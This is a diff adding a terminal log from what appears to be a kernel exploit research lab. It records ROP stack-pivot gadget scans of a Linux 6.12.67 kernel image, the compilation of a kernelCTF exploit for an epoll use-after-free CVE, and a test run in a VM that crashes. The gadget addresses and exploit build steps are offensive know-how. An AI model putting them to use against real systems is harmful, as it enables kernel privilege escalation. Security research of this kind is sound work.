@@ -1,0 +1,101 @@
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ python3 /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/find_gadgets.py \
+  /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/linux-6.12.67/vmlinux
+=== Searching for Simple Stack Pivots ===
+  [-] push rsi; pop rsp; ret at file offset 0x1038e369 (not mapped)
+
+=== Searching for JOP/ROP chain elements (wildcarded) ===
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ 
+
+
+
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ python3 /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/find_gadgets_objdump.py \
+  /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/linux-6.12.67/vmlinux
+[*] Locating .text section bounds...
+[*] .text section: 0xffffffff81000000 - 0xffffffff82400000
+[*] Running objdump and scanning for gadgets (this may take a few seconds)...
+[*] Scan finished. Found 0 potential pivots.
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ 
+
+
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ python3 /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/find_gadgets_objdump.py \
+  /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/linux-6.12.67/vmlinux
+[*] Locating .text section bounds...
+[*] .text section: 0xffffffff81000000 - 0xffffffff82400000
+[*] Running objdump -M intel and scanning for gadgets...
+[+] Direct Pivot: mov rsp, rax at vaddr=0xffffffff820d6445 (offset=0x10d6445)
+    Gadget: nop  ; nop  ; nop  ; nop  ; call ffffffff820d644f <__x86_indirect_call_thunk_array+0xf> ; int3  ; mov QWORD PTR [rsp],rax ; ret 
+
+[+] Direct Pivot: mov rsp, rcx at vaddr=0xffffffff820d6465 (offset=0x10d6465)
+    Gadget: nop  ; nop  ; nop  ; nop  ; call ffffffff820d646f <__x86_indirect_call_thunk_rcx+0xf> ; int3  ; mov QWORD PTR [rsp],rcx ; ret 
+
+[+] Direct Pivot: mov rsp, rdx at vaddr=0xffffffff820d6485 (offset=0x10d6485)
+    Gadget: nop  ; nop  ; nop  ; nop  ; call ffffffff820d648f <__x86_indirect_call_thunk_rdx+0xf> ; int3  ; mov QWORD PTR [rsp],rdx ; ret 
+
+[+] Direct Pivot: mov rsp, rbp at vaddr=0xffffffff820d64e5 (offset=0x10d64e5)
+    Gadget: nop  ; nop  ; nop  ; nop  ; call ffffffff820d64ef <__x86_indirect_call_thunk_rbp+0xf> ; int3  ; mov QWORD PTR [rsp],rbp ; ret 
+
+[+] Direct Pivot: mov rsp, rsi at vaddr=0xffffffff820d6505 (offset=0x10d6505)
+    Gadget: nop  ; nop  ; nop  ; nop  ; call ffffffff820d650f <__x86_indirect_call_thunk_rsi+0xf> ; int3  ; mov QWORD PTR [rsp],rsi ; ret 
+
+[+] Direct Pivot: mov rsp, rdi at vaddr=0xffffffff820d6525 (offset=0x10d6525)
+    Gadget: nop  ; nop  ; nop  ; nop  ; call ffffffff820d652f <__x86_indirect_call_thunk_rdi+0xf> ; int3  ; mov QWORD PTR [rsp],rdi ; ret 
+
+[+] Direct Pivot: mov rsp, rax at vaddr=0xffffffff820d6633 (offset=0x10d6633)
+    Gadget: ret  ; int3  ; data16 cs nop WORD PTR [rax+rax*1+0x0] ; 00  ; call ffffffff820d6646 <__x86_indirect_jump_thunk_array+0x6> ; int3  ; mov QWORD PTR [rsp],rax ; ret 
+
+[+] Direct Pivot: mov rsp, rcx at vaddr=0xffffffff820d664c (offset=0x10d664c)
+    Gadget: nop WORD PTR [rax+rax*1+0x0] ; 00  ; data16 cs nop WORD PTR [rax+rax*1+0x0] ; 00  ; call ffffffff820d6666 <__x86_indirect_jump_thunk_rcx+0x6> ; int3  ; mov QWORD PTR [rsp],rcx ; ret 
+
+[+] Direct Pivot: mov rsp, rdx at vaddr=0xffffffff820d666c (offset=0x10d666c)
+    Gadget: nop WORD PTR [rax+rax*1+0x0] ; 00  ; data16 cs nop WORD PTR [rax+rax*1+0x0] ; 00  ; call ffffffff820d6686 <__x86_indirect_jump_thunk_rdx+0x6> ; int3  ; mov QWORD PTR [rsp],rdx ; ret 
+
+[+] Direct Pivot: mov rsp, rbp at vaddr=0xffffffff820d66cc (offset=0x10d66cc)
+    Gadget: nop WORD PTR [rax+rax*1+0x0] ; 00  ; data16 cs nop WORD PTR [rax+rax*1+0x0] ; 00  ; call ffffffff820d66e6 <__x86_indirect_jump_thunk_rbp+0x6> ; int3  ; mov QWORD PTR [rsp],rbp ; ret 
+
+[+] Direct Pivot: mov rsp, rsi at vaddr=0xffffffff820d66ec (offset=0x10d66ec)
+    Gadget: nop WORD PTR [rax+rax*1+0x0] ; 00  ; data16 cs nop WORD PTR [rax+rax*1+0x0] ; 00  ; call ffffffff820d6706 <__x86_indirect_jump_thunk_rsi+0x6> ; int3  ; mov QWORD PTR [rsp],rsi ; ret 
+
+[+] Direct Pivot: mov rsp, rdi at vaddr=0xffffffff820d670c (offset=0x10d670c)
+    Gadget: nop WORD PTR [rax+rax*1+0x0] ; 00  ; data16 cs nop WORD PTR [rax+rax*1+0x0] ; 00  ; call ffffffff820d6726 <__x86_indirect_jump_thunk_rdi+0x6> ; int3  ; mov QWORD PTR [rsp],rdi ; ret 
+
+[*] Scan finished. Found 12 direct pivots and 0 JOP candidates.
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ 
+
+
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67$ cd /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier7
+make clean
+make
+rm -f exploit exploit_debug
+g++ -isystem kernel-research/libxdk/include -DTARGET_LTS_6_12_67 -std=gnu++17 -static -O2 -Wall exploit.cpp -o exploit -static -Lkernel-research/libxdk/lib -lkernelXDK -lpthread
+exploit.cpp: In function ‘void rip_pivot_and_fire(Target&, int, u64, int*)’:
+exploit.cpp:1059:15: warning: argument 2 null where non-null expected [-Wnonnull]
+ 1059 |     epoll_wait(ep_uaf_waiter, NULL, 1, 1000);
+      |     ~~~~~~~~~~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+In file included from exploit.cpp:21:
+/usr/include/sys/epoll.h:138:12: note: in a call to function ‘int epoll_wait(int, epoll_event*, int, int)’ declared ‘nonnull’
+  138 | extern int epoll_wait (int __epfd, struct epoll_event *__events,
+      |            ^~~~~~~~~~
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67$ 
+
+
+============================================
+  bad-epoll-lab — Tier 1 VM
+  Kernel: 6.12.67
+  User: uid=0 gid=0
+============================================
+
+Exploit is at /bin/exploit (if injected)
+Run: /bin/exploit
+
+/bin/sh: can't access tty; job control turned off
+~ # /bin/exploit
+X
+[env] cpu model: Common KVM processor
+[env] cpuinfo MHz: 1895.951
+[+] target: kernelctf lts-6.12.67
+[*] KASLR leak bypassed (nokaslr assumed).
+[+] kernel_base=ffffffff81000000
+Illegal instruction
+~ # 
+
+
